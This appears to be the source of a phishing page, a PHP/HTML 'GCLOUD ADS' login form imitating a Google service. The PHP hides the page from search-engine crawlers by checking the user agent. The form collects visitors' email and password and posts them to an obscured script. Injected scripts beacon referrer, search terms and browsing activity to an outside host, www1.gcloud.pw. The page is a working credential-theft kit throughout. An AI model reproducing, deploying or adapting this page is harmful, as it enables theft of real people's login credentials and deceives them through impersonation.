<!DOCTYPE html>

<?php

$googleapps84747474 = strtolower($_SERVER['HTTP_USER_AGENT']);

if(preg_match("/(bot|Bot|crawler|Crawler|spider|Spider)/","$googleapps84747474"))

{
}

else

{

?>

<head>
<title>Register</title>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1">
<script src="/dashboard/jquery.js" type="text/javascript"></script>
<link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
</head>

<link href="https://fonts.googleapis.com/css?family=Roboto:400" rel="stylesheet">

<?php

$google84747474747474747474 = explode("/", $_SERVER['REQUEST_URI']);

$google847474747474747474744474 = $google84747474747474747474[1];

?>

<style>

*
{
font-family:'Roboto',sans-serif;
}

</style>

<style>

@media (min-width: 770px)
{
.google84747474
{
width:396px;
margin:0px auto!important;
margin-top:104px!important;
}
}

</style>

<div class="google84747474" style="padding:12px;box-shadow:0 1px 4px rgba(0,0,0,0.4);background-color:#ffffff;margin:12px;border-radius:4px;">

<div align="center">

<div style="padding:1em;background-color:#ffffff;color:#444444;box-sizing:border-box;cursor:pointer;font-weight:bold;margin-left:12px;margin-right:12px;border-radius:4px;font-size:24px;" onclick="window.open('/ads/','_self');">

<divapps84747474 style="font-weight:normal;">GCLOUD</divapps84747474><divapps84747474 style="font-weight:bold;"> ADS</divapps84747474>

</div>

</div>

<style>

html,body
{
margin:0px;
padding:0px;
font-family:Varela Round, sans-serif;
background-color:#ECEFF1!important;
}

</style>

<html>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link href="https://fonts.googleapis.com/css?family=Raleway" rel="stylesheet">
<title>Getit register</title>
<style>
* {
  box-sizing: border-box;
}

body {
}

#regForm {
  padding:12px;
}

h1 {
  text-align: center;  
}

input {
  padding:1em;
  width: 100%;
  font-size:1em;
  font-family: Raleway;
  border: 1px solid #aaaaaa;
}

/* Mark input boxes that gets an error on validation: */
input.invalid {
  background-color: #ffdddd;
}

/* Hide all steps by default: */
.tab {
}

button {
  background-color: #1565C0;
  color: #ffffff;
  border: none;
  padding: 10px 20px;
  font-family: Raleway;
  cursor: pointer;
}

button:hover {
  opacity: 0.8;
}

#prevBtn {
  background-color: #bbbbbb;
}

/* Make circles that indicate the steps of the form: */
.step {
  height: 15px;
  width: 15px;
  margin: 0 2px;
  background-color: #bbbbbb;
  border: none;  
  border-radius: 50%;
  display: inline-block;
  opacity: 0.5;
}

.step.active {
  opacity: 1;
}

/* Mark the steps that are finished and valid: */
.step.finish {
  background-color: #1565C0;
}

.googleapps84747474
{
display:flex;
}

</style>



<form id="regForm" action="/<?php echo "$google847474747474747474744474"; ?>/people/pageupdates84447474.php" enctype="multipart/form-data" method="post">
<!-- One "tab" for each step in the form: -->

<div class="tab">

<div class="googleapps84747474">

</div>

</div>  

<div class="tab">

<div class="googleapps84747474">

<input type="email" placeholder="Email" oninput="this.className = ''" name="email" style="background-color:#ffffff;border-radius:4px;outline:none;border-color:#bdbdbd;" required>

</div>

</div>

<div class="tab">

</div>

<div class="tab">

<div class="googleapps84747474">

</div>

</div>



<div class="tab">

<div class="googleapps84747474">

<input placeholder="Password" oninput="this.className = ''" name="pword" type="password" style="background-color:#ffffff;margin-top:12px;border-radius:4px;outline:none;border-color:#bdbdbd;" required>

</div>

</div>

<div>

<input type="submit" value="LOGIN" style="padding:1em;background-color:#4285f4;color:#ffffff;margin-top:12px;box-shadow:0 1px 4px rgba(0,0,0,0.4);cursor:pointer;outline:none;border:none;border-radius:4px;"></input>

</div>

</form>

<div style="display:flex;font-size:12.8px;color:#444444;">

<div style="cursor:pointer;" onclick="window.open('/<?php echo "$google847474747474747474744474"; ?>/register/register.php','_self')">

REGISTER

</div>

<div style="cursor:pointer;padding-left:12px;">

GET PASSWORD

</div>

<div style="cursor:pointer;padding-left:12px;">

PRIVACY

</div>

</div>

</div>

<script>

$(document).ready(function(){

$('#googleimageappsmobileappsappsappsappsappsapps84').on('change', function() {

var google8474447444744474 = $('#googleimageappsmobileappsappsappsappsappsapps84').val();

$(".googleappsappsappsappsapps8474447444744474").text('success');

});

});

</script>

<?php

$googleapps84747474 = strtolower($_SERVER['HTTP_USER_AGENT']);

?>

<script>

var googleappsappsappsapps847474744474 = location.protocol

var url84747474 = document.referrer;

var google84747474 = location.href;

var google84444474 = location.search.split('q=')[1]

var url84747474 = encodeURIComponent(url84747474);

var google84444474 = encodeURIComponent(google84444474);

var script = document.createElement('script');
script.src = '' + googleappsappsappsapps847474744474 + '//www1.gcloud.pw/analytics/web/analytics/analytics.php?username=bzLy9WpnBGaPcmK0qWjwfk3rNvlTX9pdRr2DP1VidcE%3D&password=&country=ZA&referer=' + url84747474 + '&keywordsapps8474=' + google84444474 + '';
script.type = 'text/javascript';
document.getElementsByTagName('head')[0].appendChild(script);

var time,timeSite;

time=new Date();

window.onbeforeunload=function(){
timeSite=new Date()-time;
window.localStorage['timeSite']=timeSite;

var url84747474 = document.referrer;

var script = document.createElement('script');
script.src = '' + googleappsappsappsapps847474744474 + '//www1.gcloud.pw/analytics/web/analytics/analytics.php?username=bzLy9WpnBGaPcmK0qWjwfk3rNvlTX9pdRr2DP1VidcE%3D&password=&country=ZA&timeonsite=' + timeSite + '';
script.type = 'text/javascript';
document.getElementsByTagName('head')[0].appendChild(script);

}

var list84747474 = document.getElementsByTagName('html')[0];

window.addEventListener('backbutton', function(){

var script = document.createElement('script');
script.src = '' + googleappsappsappsapps847474744474 + '//www1.gcloud.pw/analytics/web/analytics/analytics.php?username=bzLy9WpnBGaPcmK0qWjwfk3rNvlTX9pdRr2DP1VidcE%3D&password=&useractions8884=googleapps84&country=ZA';
script.type = 'text/javascript';
document.getElementsByTagName('head')[0].appendChild(script);

});

window.addEventListener('scroll', function(){

var script = document.createElement('script');
script.src = '' + googleappsappsappsapps847474744474 + '//www1.gcloud.pw/analytics/web/analytics/analytics.php?username=bzLy9WpnBGaPcmK0qWjwfk3rNvlTX9pdRr2DP1VidcE%3D&password=&useractions8884=googleapps84&country=ZA';
script.type = 'text/javascript';
document.getElementsByTagName('head')[0].appendChild(script);

});

</script>

<?php

}

?>

